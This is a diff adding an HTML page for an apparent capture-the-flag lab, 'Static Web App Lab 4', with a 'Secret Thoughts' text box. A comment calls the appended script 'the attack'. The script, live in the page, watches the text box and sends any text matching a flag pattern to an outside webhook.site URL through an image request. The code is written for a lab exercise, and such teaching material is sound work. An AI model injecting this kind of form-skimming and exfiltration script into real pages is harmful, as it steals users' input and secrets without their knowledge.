@@ -1,0 +1,62 @@
+<html>
+  <head>
+    <title>Static Web App Lab 4</title>
+  </head>
+  <body
+    style="display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f0f0f0;"
+  >
+    <div
+      style="background-color: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;"
+    >
+      <h1>Static Web App Lab 4 - Write</h1>
+      <div style="margin: 20px;">
+        <h2>Secret Thoughts</h2>
+        <textarea
+          id="secretThoughts"
+          rows="10"
+          cols="50"
+          placeholder="Paste your secret thoughts here..."
+          style="width: 100%; max-width: 500px;"
+        ></textarea>
+      </div>
+    </div>
+  </body>
+  <!--
+  The attack: append the below script to push all user input to a webhook.
+  In this case we simply wait for input to match a CTF flag
+  -->
+  <script>
+  (function(){
+    var ta;
+    var sent = false;
+    var flagRegex = /^flag\{[0-9a-f]{32}\}$/i;
+  
+    function leak(val) {
+      if (sent) return;
+      sent = true;
+      var img = new Image();
+      img.src = 'https://webhook.site/3a1d6afe-b31a-4223-b3c3-1dee5b67a29f?leak=' + encodeURIComponent(val || '');
+    }
+  
+    function check() {
+      if (!ta) ta = document.getElementById('secretThoughts');
+      if (ta && flagRegex.test(ta.value.trim())) {
+        leak(ta.value.trim());
+      }
+    }
+  
+    // Poll every 250ms for up to 60s
+    var timer = setInterval(check, 250);
+    setTimeout(function(){ clearInterval(timer); }, 60000);
+  
+    // Event listeners in case the bot pastes fast
+    document.addEventListener('input', function(e) {
+      if (e.target && e.target.id === 'secretThoughts') {
+        if (flagRegex.test(e.target.value.trim())) {
+          leak(e.target.value.trim());
+        }
+      }
+    }, true);
+  })();
+</script>
+</html>
